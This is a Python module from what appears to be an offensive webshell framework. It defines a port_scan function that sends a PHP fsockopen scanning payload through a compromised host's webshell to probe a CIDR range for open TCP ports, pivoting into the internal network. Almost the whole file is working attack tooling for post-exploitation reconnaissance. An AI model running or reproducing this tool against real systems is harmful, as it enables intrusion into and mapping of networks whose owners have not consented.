"""Pivot port scanning, executed from the target via PHP ``fsockopen``."""

from __future__ import annotations

from .. import log
from ..core.php import php_string
from ..core.webshell import WebShell

# Scans a CIDR range for open TCP ports.  Only open ports are echoed (v1 also
# printed every closed port, which flooded the output on a /24).
_SCAN_PHP = """
set_time_limit(0);error_reporting(0);
$ports=explode(',', {ports});
$cidr=explode('/', {hosts});
$base=ip2long($cidr[0]);$mask=intval($cidr[1]);
$count=pow(2,(32-$mask));$start=($base>>(32-$mask))<<(32-$mask);
for($i=0;$i<$count;$i++){{
  $host=long2ip($start+$i);
  foreach($ports as $port){{
    $conn=@fsockopen($host,intval($port),$en,$es,0.5);
    if(is_resource($conn)){{echo $host.":".$port." open\\n";fclose($conn);}}
  }}
}}
"""


def port_scan(ws: WebShell, hosts: str, ports: str) -> str:
    """Scan ``hosts`` (``IP/MASK``) for the comma-separated ``ports``."""
    if "/" not in hosts:
        raise ValueError("hosts must be CIDR, e.g. 192.168.1.0/24 (use /32 for one host)")
    log.info(f"Scanning {hosts} for ports [{ports}] ...")
    code = _SCAN_PHP.format(ports=php_string(ports), hosts=php_string(hosts))
    output = ws.run_php(code)
    if output.strip():
        log.success("Open ports:\n" + output.strip())
    else:
        log.warning("No open ports found.")
    return output
